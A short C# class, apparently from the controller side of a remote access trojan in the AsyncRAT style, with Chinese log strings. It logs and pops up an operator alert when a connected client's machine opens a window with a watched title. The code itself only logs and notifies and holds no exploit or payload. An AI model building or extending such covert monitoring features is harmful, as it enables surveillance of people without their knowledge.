using Server.Connection;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
    public class HandleReportWindow
    {
        public HandleReportWindow(Clients client, string title)
        {
            //new HandleLogs().Addmsg($"Client {client.Ip} Opened [{title}]", Color.Blue);
            new HandleLogs().Addmsg($"客户端 {client.Ip} 打开 [{title}]", Color.Blue);
            if (Properties.Settings.Default.Notification == true)
            {
                //Program.form1.notifyIcon1.BalloonTipText = $"Client {client.Ip} Opened [{title}]";
                Program.form1.notifyIcon1.BalloonTipText = $"客户端 {client.Ip} 打开 [{title}]";
                Program.form1.notifyIcon1.ShowBalloonTip(100);
            }
        }
    }
}
